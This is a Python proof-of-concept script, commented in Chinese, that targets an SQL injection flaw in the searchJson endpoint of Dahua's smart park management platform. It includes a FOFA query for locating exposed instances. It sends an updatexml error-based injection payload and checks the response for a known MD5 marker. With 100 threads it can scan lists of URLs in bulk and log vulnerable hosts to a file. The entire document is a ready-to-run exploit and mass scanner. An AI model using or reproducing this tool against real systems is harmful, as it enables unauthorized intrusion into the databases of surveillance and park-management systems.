# 大华智慧园区综合管理平台 searchJson SQL注入漏洞
# FOFA:app="dahua-智慧园区综合管理平台"

import requests,argparse,sys,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def bunner():
    test = """
\x1b[38m██████╗  █████╗ ██╗  ██╗██╗   ██╗ █████╗         ███████╗ ██████╗ ██╗     
\x1b[36m██╔══██╗██╔══██╗██║  ██║██║   ██║██╔══██╗        ██╔════╝██╔═══██╗██║     
\x1b[34m██║  ██║███████║███████║██║   ██║███████║        ███████╗██║   ██║██║     
\x1b[35m██║  ██║██╔══██║██╔══██║██║   ██║██╔══██║        ╚════██║██║▄▄ ██║██║     
\x1b[31m██████╔╝██║  ██║██║  ██║╚██████╔╝██║  ██║███████╗███████║╚██████╔╝███████╗
\x1b[33m╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝ ╚══▀▀═╝ ╚══════╝
                                        --author:Kucei
                                        --Vession:SearchJson_SQL 1.0.0                                                                                                              
\x1b[0m"""
    print(test)

def main():
    bunner()
    # 初始化
    parser = argparse.ArgumentParser("大华智慧园区综合管理平台 searchJson SQL注入漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()
    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        # 创建一个列表接收 文件夹的URL
        url_list = []
        with open(args.file,'r') as fp:
            # 遍历文件夹内的URL
            for url in fp.readlines():
                # append 往列表添加元素
                url_list.append(url.strip())
        # 创建线性池
        pool = Pool(100)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else :
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,MD5(14),0x7e),1)--%22%7D/extend/%7B%7D'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close'
    }
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    try :
        response = requests.get(url=target+url_payload,headers=headers,proxies=proxies,verify=False,timeout=5)
        match = re.findall(r'~aab3238922bcc25a6f606eb525ffdc5',response.text)
        # print(match)
        if response.status_code == 500 and match[0] == '~aab3238922bcc25a6f606eb525ffdc5':
            print( f"[+] {target} 存在SQL注入漏洞")
            with open('result.txt','a',encoding='utf-8')as f:
                f.write(target+'\n')
        else:
            print(f"[-]{target}不存在SQL注入漏洞")
    except Exception:
        print(target+"--站点连接异常--")

if __name__ == '__main__':
    main()